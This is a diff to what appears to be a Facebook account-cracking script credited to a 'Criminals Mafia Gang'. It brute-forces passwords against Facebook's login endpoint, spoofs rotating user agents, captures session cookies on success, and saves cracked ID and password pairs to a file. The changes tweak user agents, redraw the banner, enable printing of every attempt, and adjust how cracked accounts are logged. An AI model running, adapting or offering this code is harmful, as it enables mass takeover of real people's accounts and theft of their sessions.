@@ -82,13 +82,13 @@ loop = 0
 url_lookup = "https://lookup-id.com/"
 url_mb = "https://m.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"}
+header_grup = {"user-agent": "Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6"}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
 done = False
 
 ugen=[]
 for x in range(100):
-    aa='Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
+    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931'
     b=random.choice(['6','7','8','9','10','11','12'])
     c=' en-us; GT-'
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -120,15 +120,15 @@ logo ="""
 \033[1;37mY88b  d88P d8b 888   "   888 d8b Y88b  d88P \033[1;31mR
  \033[1;37m"Y8888P"  Y8P 888       888 Y8P  "Y8888P88 \033[1;31mE
                                                     
-\033[1;93mâ–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²â–²
-\033[1;37m[âœ«] TEAM      [âœ«]\033[1;36m  CRIMINALS MAFIA GANG
-\033[1;37m[âœ«] MAKER     [âœ«]\033[1;35m   SHAMROZ-KING-BRAND
-\033[1;37m[âœ«] FACEBOOK  [âœ«]\033[1;35m    SHAMROZ TRICKER
-\033[1;37m[âœ«] GITHUB    [âœ«]\033[1;35m    SH4MR0Z-TR1CK3R
-\033[1;37m[âœ«] VERSION   [âœ«]\033[1;32m      (0.1) TRIAL
-\033[1;37m[âœ«] STATUS    [âœ«]\033[1;32m      ALWAYS-FREE
-               ðŸ‘‰ðŸ˜ˆ \033[1;31mHATERS MAKE ME FAMOUS ðŸ˜ƒðŸ’™
-\033[1;93mâ–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼â–¼
+\033[1;93m===============================================
+\033[1;37m[=] TEAM      :\033[1;36m  CRIMINALS MAFIA GANG
+\033[1;37m[=] MAKER     :\033[1;35m   SHAMROZ-KING-BRAND
+\033[1;37m[=] FACEBOOK  :\033[1;35m    SHAMROZ TRICKER
+\033[1;37m[=] GITHUB    :\033[1;35m        SH4MR0Z-TR1CK3R
+\033[1;37m[=] VERSION   :\033[1;32m               (0.1) TRIAL
+\033[1;37m[=] STATUS    :\033[1;32m               ALWAYS-FREE
+                      \033[1;31mHATERS MAKE ME FAMOUS\033[1;36m™
+\033[1;93m===============================================
 
 '\33[1;97mTURN on & off (ARPLANE MODE) before use'   
 \033[1;97m=================================================="""
@@ -279,13 +279,13 @@ def rcrack(uid,pwx,tl):
 			'user-agent': pro,}
 			lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
-			#print(iid+'|'+pws+'|'+str(log_cookies))
+			print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[7:22]
-				print('\33[1;92m[SHAMROZ-OK] '+iid+' | '+ps+'\33[0;97m')
+				print('\33[1;92m[SHAMROZ-OK] '+uid+' | '+ps+'\33[0;97m')
 				cek_apk(session,coki)
-				open('ok.txt', 'a').write(iid+' | '+ps+'\n')
+				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			else:
